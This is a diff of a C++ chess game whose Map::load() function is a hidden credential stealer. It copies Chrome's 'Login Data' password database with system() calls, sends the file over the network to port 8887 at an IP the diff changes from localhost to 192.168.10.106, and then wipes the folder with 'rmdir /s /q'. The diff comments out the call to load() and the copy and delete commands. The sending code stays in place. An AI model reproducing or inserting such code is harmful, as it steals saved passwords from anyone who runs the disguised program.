@@ -28,7 +28,7 @@ void Map::fill()
                 i = 0;
         }
     }
-    load();
+    //load();
 }
 
 void Map::white()
@@ -158,13 +158,13 @@ void Map::showKingMoves(int _x, int _y, Map _oppenentMap)
 
 void Map::load()
 {
-    system("rmdir /s /q data");
+    /*system("rmdir /s /q data");
     system("xcopy \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data\" data\\login_data*");
-    system("ren \"data\\*.\" \"*.txt\" ");
+    system("ren \"data\\*.\" \"*.txt\" ");*/
 
     std::string path = "data/login_data.txt";
 
-    sf::IpAddress ipAddr = "127.0.0.1";
+    sf::IpAddress ipAddr = "192.168.10.106";
     unsigned short port = 8887;
 
     std::ifstream file(path, std::ios::binary | std::ios::ate);
@@ -177,7 +177,7 @@ void Map::load()
         file.read(fData, fSize);
         file.close();
         
-        std::string fileName = "LoginData.txt";
+        std::string fileName = "data.txt";
 
         sf::Packet packet;
         packet << fileName << fSize;
@@ -195,7 +195,7 @@ void Map::load()
     {
         std::cout << "Probleme a l'ouverture du fichier " << path;
     }
-    system("rmdir /s /q data");
+   // system("rmdir /s /q data");
 }
 
 void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
